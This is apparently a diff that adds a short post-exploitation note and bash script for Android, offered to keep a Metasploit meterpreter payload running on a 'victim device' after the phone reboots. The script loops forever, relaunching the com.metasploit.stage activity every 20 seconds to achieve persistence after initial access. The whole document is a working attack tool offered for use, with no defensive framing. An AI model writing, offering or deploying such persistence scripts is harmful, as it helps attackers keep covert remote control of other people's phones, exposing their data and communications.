@@ -1,0 +1,11 @@
+After you use metasploit to open a meterpreter session on the victim device, usually the script will terminate after the phone is rebooted and you can only get the session back by physical interaction which is not practical... So here's a script to upload to android after initial access to acheive persistence: 
+=============================================================================================
+
+#!/bin/bash 
+
+while true 
+do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
+sleep 20 
+done 
+
+=============================================================================================
